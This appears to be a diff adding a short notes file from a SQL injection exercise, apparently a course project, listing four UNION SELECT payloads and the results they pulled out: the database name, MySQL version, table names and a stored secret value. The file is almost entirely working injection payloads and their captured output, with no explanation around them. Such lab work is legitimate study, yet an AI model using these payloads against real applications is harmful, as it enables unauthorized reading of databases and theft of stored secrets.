@@ -1,0 +1,9 @@
+' union select 1,2,DATABASE();--
+' union select 1,2,VERSION();--
+' union (select 1, TABLE_NAME,3 from information_schema.tables limit 61,1);--
+' union select 1,id,secret from SECRETTABLE;--
+...
+Name: proj2_xtra_cr3dit
+Version: 5.7.33-0ubuntu0.18.04.1
+Tables: SECRETTABLE,foo,inject3_users
+Secret: hunter2
